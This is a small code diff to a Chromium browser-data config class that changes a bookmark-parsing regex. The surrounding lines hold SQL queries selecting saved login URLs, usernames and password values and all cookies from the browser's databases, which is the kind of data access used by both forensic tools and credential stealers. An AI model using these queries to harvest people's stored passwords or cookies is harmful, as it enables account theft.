@@ -10,7 +10,7 @@ user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Ge
 
 class ChromiumConfig:
 
-    BookmarksRegex = compile(r'.*"name":[\s]+"(.*)".*"type".*"url":[\s]+"([^\s]+)"', IGNORECASE + DOTALL)
+    BookmarksRegex = compile(r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL)
 
     PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
     CookiesSQL = "SELECT * FROM cookies"
